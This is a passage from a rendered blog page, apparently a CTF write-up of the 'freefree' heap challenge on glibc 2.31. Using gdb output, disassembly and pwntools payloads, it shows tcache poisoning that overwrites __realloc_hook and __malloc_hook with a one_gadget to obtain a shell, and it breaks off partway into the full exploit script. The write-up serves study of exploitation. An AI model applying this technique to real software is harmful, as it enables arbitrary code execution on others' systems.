r13\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c800a <+10>:  push   r12\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c800c <+12>:  mov    r12,rsi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c800f <+15>:  push   rbp\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8010 <+16>:  mov    rbp,rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8013 <+19>:  push   rbx\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8014 <+20>:  sub    rsp,0x18\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8018 <+24>:  mov    rax,QWORD PTR [rip+0x14cfc1]        # 0x7f5c37314fe0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c801f <+31>:  mov    rax,QWORD PTR [rax]\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8022 <+34>:  test   rax,rax                             # Check if __realloc_hook is null or not\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8025 <+37>:  jne    0x7f5c371c8260 <__GI___libc_realloc+608>\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   ...\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8260 <+608>: mov    rdx,QWORD PTR [rsp+0x48]\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8265 <+613>: add    rsp,0x18\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8269 <+617>: pop    rbx\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c826a <+618>: pop    rbp\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c826b <+619>: pop    r12\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c826d <+621>: pop    r13\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c826f <+623>: pop    r14\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8271 <+625>: pop    r15\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8273 <+627>: jmp    rax\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So in our case that \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" is not null (we will overwrite with one gadget), it then \",(0,e.jsx)(n.code,{children:\"pop\"}),\" and execute the function inside \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\". So if we overwrite \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" with \",(0,e.jsx)(n.code,{children:\"realloc + 24\"}),\" (address is \",(0,e.jsx)(n.code,{children:\"0x00007f5c371c8018\"}),\"), which means we don\\u2019t push any register, but we can pop all 6 value on stack in to rbx, rbp, r12, r13, r14, r15, and also the stack didn\\u2019t change, we can control it more easily. And here is the status of stack:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d0\\u2502+0x0000: \"D=malloc(4096)\\\\n\"   \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d8\\u2502+0x0008: \"(4096)\\\\n\"\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e0\\u2502+0x0010: 0x0000557c12fa02a0  \\u2192  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e8\\u2502+0x0018: 0x0000557c12fc2020  \\u2192  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4f0\\u2502+0x0020: 0x0000557c12fe4020  \\u2192  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4f8\\u2502+0x0028: 0x0000557c13005010  \\u2192  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f500\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f508\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"So if we successfully pop 6 register, those register will be changed! And we know that we can create chunk with index up to 25 so just simply malloc with the larger index, r12 and r15 will contain 0 after that 6 pop.\"}),`\n`,(0,e.jsx)(n.p,{children:\"And there is one more thing to notice:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  p&__realloc_hook\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`$1 = (void *(**)(void *, size_t, const void *)) 0x7f5c37315b68 <__realloc_hook>\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/xg 0x7f5c37315b68\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x7f5c37315b68 <__realloc_hook>:  0x00007f5c371c7bf0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/xg 0x7f5c37315b68 + 0x8\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x7f5c37315b70 <__malloc_hook>: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/2xg 0x7f5c37315b68\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x7f5c37315b68 <__realloc_hook>:  0x00007f5c371c7bf0  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`                                  (__realloc_hook)     (__malloc_hook)\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"That means \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" and \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" is next to each other. So we can overwrite 2 of them at the same time easily. So that\\u2019s the idea. Now we start our final stage!\"]}),`\n`,(0,e.jsx)(n.p,{children:\"At the stage 2, we have chunk index 2 has size of 0xcf0, next to chunk 2 is the freed top chunk contain the forward pointer and backward pointer due to tcache link list:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/10xg 0x0000557c12fe4020 - 0x10\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4010: 0x0000000000000000  0x0000000000000cf1    <-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4020: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4030: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4040: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4050: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/10xg 0x0000557c12fe4020 - 0x10 + 0xcf0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4d00: 0x0000000000000000  0x00000000000002e1    <-- Second freed top chunk\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4d10: 0x0000557c12fc2d10  0x0000557c12fa0010\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4d20: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4d30: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4d40: 0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Notice that the freed top chunk size changed to \",(0,e.jsx)(n.code,{children:\"0x2e1\"}),\". So now we overwrite forward pointer with \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\", just keep the same size as \",(0,e.jsx)(n.code,{children:\"0x2e0\"}),\" to make sure there\\u2019s no error (address changed):\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Prevsize\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2e1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'__realloc_hook'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And then we just malloc 2 chunk with the same size \",(0,e.jsx)(n.code,{children:\"0x2e0\"}),\", we will get the second chunk is \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" address:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`malloc(3, 0x2e0-0x10)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`malloc(3, 0x2e0-0x10)\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We can see the \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" address is saved on stack:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f70\\u2502+0x0000: \"D=malloc(720)\\\\n\"  \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f78\\u2502+0x0008: 0x00000a2930323728 (\"(720)\\\\n\"?)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f80\\u2502+0x0010: 0x0000559462b382a0  \\u2192  0x0000000000000000    <-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f88\\u2502+0x0018: 0x0000559462b5a020  \\u2192  0x0000000000000000    <-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f90\\u2502+0x0020: 0x0000559462b7c020  \\u2192  0x0000000000000000    <-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f98\\u2502+0x0028: 0x00007f6549689b68  \\u2192  0x00007f654953bbf0  \\u2192  <realloc_hook_ini+0> endbr64\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968fa0\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968fa8\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So we successfully malloc with \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\". Now we just need to change value of \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" and \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" and that\\u2019s the easiest part in the world. Remember that we will write address of \",(0,e.jsx)(n.code,{children:\"realloc + 24\"}),\" to \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" so it just pop, not push and the stack is remain until 6 \",(0,e.jsx)(n.code,{children:\"pop\"}),\", also the constraints is satisfied:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xe6aee\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'realloc'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Running script and stop before first \",(0,e.jsx)(n.code,{children:\"pop\"}),\", the stack look like this\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ed0\\u2502+0x0000: 0x0000556efad732a0  \\u2192  0x0000000000000000    <-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ed8\\u2502+0x0008: 0x0000556efad95020  \\u2192  0x0000000000000000    <-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ee0\\u2502+0x0010: 0x0000556efadb7020  \\u2192  0x0000000000000000    <-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ee8\\u2502+0x0018: 0x00007fa6716c4b68  \\u2192  0x00007fa6715bfaee  \\u2192  <execvpe+638> mov rdx, r12\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ef0\\u2502+0x0020: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ef8\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5f00\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5f08\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The assembly code at pop look like this:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/10i $rip\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`=> 0x7fa671577269 <__GI___libc_realloc+617>:  pop    rbx\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa67157726a <__GI___libc_realloc+618>:  pop    rbp\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa67157726b <__GI___libc_realloc+619>:  pop    r12\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa67157726d <__GI___libc_realloc+621>:  pop    r13\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa67157726f <__GI___libc_realloc+623>:  pop    r14\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa671577271 <__GI___libc_realloc+625>:  pop    r15\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa671577273 <__GI___libc_realloc+627>:  jmp    rax\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Just 6 pop, if we increase the index of chunk a bit, we can get r12 and r15 null easily. So we will add a variable called \",(0,e.jsx)(n.code,{children:\"n\"}),\" plus with all index to increase the index, this is more effective way than changing index one by one, it can make you confused.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"For example, with the \",(0,e.jsx)(n.code,{children:\"gets(3, payload)\"}),\" at the end, we will change it to \",(0,e.jsx)(n.code,{children:\"gets(3+n, payload)\"}),\" and with n can be changed. I will choose \",(0,e.jsx)(n.code,{children:\"n=10\"}),\" and new index will be 10, 11, 12, 13 and 14. That\\u2019s the perfect index and we now get the shell.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Full code:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` subprocess\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` time\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` string\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'./libc-2.31.so'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token boolean\",children:\"False\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" exe \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'./freefree'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token boolean\",children:\"False\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# context.log_level = 'debug'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'one_gadget'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xe6aee\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'main_arena'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1ec1e0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"getchar\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"return\"}),\" string\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"ascii_uppercase\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"malloc\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" num\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tp\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'> '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'{}=malloc({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" num\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"gets\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tp\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'> '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'gets({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\ttime\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sleep\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tp\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendline\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"puts\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tp\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'> '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'puts({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token 